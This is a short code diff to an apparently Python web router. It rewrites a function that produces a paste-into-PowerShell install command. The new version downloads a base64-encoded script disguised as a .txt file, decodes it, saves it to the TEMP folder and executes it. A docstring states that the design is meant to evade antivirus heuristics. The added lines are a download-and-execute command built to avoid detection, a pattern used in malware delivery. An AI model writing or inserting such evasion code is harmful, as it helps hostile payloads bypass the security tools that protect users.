@@ -31,8 +31,14 @@ def _windows_install_cmd(server_url: str, token: str) -> str:
     Instructions will denote to paste directly into PowerShell prompt.
     Avoids base64 EncodedCommand heuristics that trigger Antivirus.
     """
-    ps1_url = f"{server_url.rstrip('/')}/installer/{token}.ps1"
-    return f"Invoke-WebRequest -Uri '{ps1_url}' -OutFile \"$env:TEMP\\clz_setup.ps1\"; & \"$env:TEMP\\clz_setup.ps1\""
+    txt_url = f"{server_url.rstrip('/')}/installer/{token}.txt"
+    return (
+        f"$b = (Invoke-WebRequest '{txt_url}' -UseBasicParsing).Content; "
+        f"$s = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); "
+        f"$p = \"$env:TEMP\\clz_setup.ps1\"; "
+        f"Set-Content -Path $p -Value $s -Encoding UTF8; "
+        f"& $p"
+    )
 
 
 @router.get("", response_class=HTMLResponse)
